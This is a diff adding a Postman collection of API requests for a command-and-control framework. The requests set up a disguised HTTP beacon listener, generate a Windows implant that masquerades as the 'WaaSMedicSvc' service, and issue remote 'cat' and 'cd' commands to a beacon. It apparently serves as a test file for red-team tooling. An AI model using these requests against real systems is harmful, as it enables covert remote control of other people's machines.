@@ -1,0 +1,167 @@
+{
+	"info": {
+		"_postman_id": "387ff5c7-9003-47c4-a7ca-7a5fc248de67",
+		"name": "C2",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "29627866"
+	},
+	"item": [
+		{
+			"name": "test",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://192.168.1.1:8080/api/test",
+					"protocol": "https",
+					"host": [
+						"192",
+						"168",
+						"1",
+						"1"
+					],
+					"port": "8080",
+					"path": [
+						"api",
+						"test"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "/api/listener/create",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n  \"name\": \"http_listener_01\",\r\n  \"type\": \"Beacon-HTTP\",\r\n  \"config\": {\r\n    \"host_bind\": \"192.168.1.1\",\r\n    \"port_bind\": 9000,\r\n    \"callback_addresses\": [\r\n      \"192.168.1.1:9000\",\r\n      \"192.168.1.100:8082\"\r\n    ],\r\n    \"ssl\": false,\r\n    \"ssl_cert\": \"\",\r\n    \"ssl_key\": \"\",\r\n    \"ssl_cert_path\": \"\",\r\n    \"ssl_key_path\": \"\",\r\n    \"uri\": \"/index.php\",\r\n    \"hb_header\": \"X-Session-Id\",\r\n    \"hb_prefix\":\"SESSIONID=\",\r\n    \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\",\r\n    \"host_header\": \"192.168.1.1:9000\",\r\n    \"request_headers\": {},\r\n    \"response_headers\": {\r\n      \"Server\": \"nginx\",\r\n      \"Content-Type\": \"application/json\"\r\n    },\r\n    \"x_forwarded_for\": false,\r\n    \"page_error\": \"<html><body>error</body></html>\",\r\n    \"page_payload\": \"<<<PAYLOAD_DATA>>>\",\r\n    \"server_headers\": {},\r\n    \"protocol\": \"http\",\r\n    \"encrypt_key\": \"01234567890123456789\"\r\n  }\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://192.168.1.1:8081/api/listener/create",
+					"protocol": "https",
+					"host": [
+						"192",
+						"168",
+						"1",
+						"1"
+					],
+					"port": "8081",
+					"path": [
+						"api",
+						"listener",
+						"create"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "/api/beacon/generate",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n  \"listener_name\": \"http_listener_01\",\r\n  \"listener_type\": \"Beacon-HTTP\",\r\n  \"beacon_type\": \"Beacon\",\r\n  \"config\":{\r\n    \"arch\":\"x64\",\r\n    \"os\":\"windows\",\r\n    \"format\":\"exe\",\r\n    \"sleep\":10,\r\n    \"jitter\":20,\r\n    \"svcname\":\"WaaSMedicSvc\",\r\n    \"is_killdate\":true,\r\n    \"kill_date\":\"2025-12-31\",\r\n    \"kill_time\":\"23:59:59\",\r\n    \"is_workingtime\":false,\r\n    \"start_time\":\"09:00\",\r\n    \"end_time\":\"18:00\"\r\n  }\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://192.168.1.1:8081/api/beacon/generate",
+					"protocol": "https",
+					"host": [
+						"192",
+						"168",
+						"1",
+						"1"
+					],
+					"port": "8081",
+					"path": [
+						"api",
+						"beacon",
+						"generate"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "/api/beacon/command/execute(cat)",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"beacon_type\": \"Beacon\",\r\n    \"beacon_id\": \"55667788\",\r\n    \"cmdline\": \"cat C:\\\\Users\\\\BitDefender\\\\Desktop\\\\ProcessExplorer\\\\Eula.txt\",\r\n    \"data\": {\r\n        \"command\": \"cat\",\r\n        \"path\": \"C:\\\\Users\\\\BitDefender\\\\Desktop\\\\ProcessExplorer\\\\Eula.txt\"\r\n    }\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://192.168.1.1:8081/api/beacon/command/execute",
+					"protocol": "https",
+					"host": [
+						"192",
+						"168",
+						"1",
+						"1"
+					],
+					"port": "8081",
+					"path": [
+						"api",
+						"beacon",
+						"command",
+						"execute"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "/api/beacon/command/execute(cd)",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"beacon_type\": \"Beacon\",\r\n    \"beacon_id\": \"55667788\",\r\n    \"cmdline\": \"cd C:\\\\Users\\\\BitDefender\\\\Desktop\\\\ProcessExplorer\",\r\n    \"data\": {\r\n        \"command\": \"cd\",\r\n        \"path\": \"C:\\\\Users\\\\BitDefender\\\\Desktop\\\\ProcessExplorer\"\r\n    }\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://192.168.1.1:8081/api/beacon/command/execute",
+					"protocol": "https",
+					"host": [
+						"192",
+						"168",
+						"1",
+						"1"
+					],
+					"port": "8081",
+					"path": [
+						"api",
+						"beacon",
+						"command",
+						"execute"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
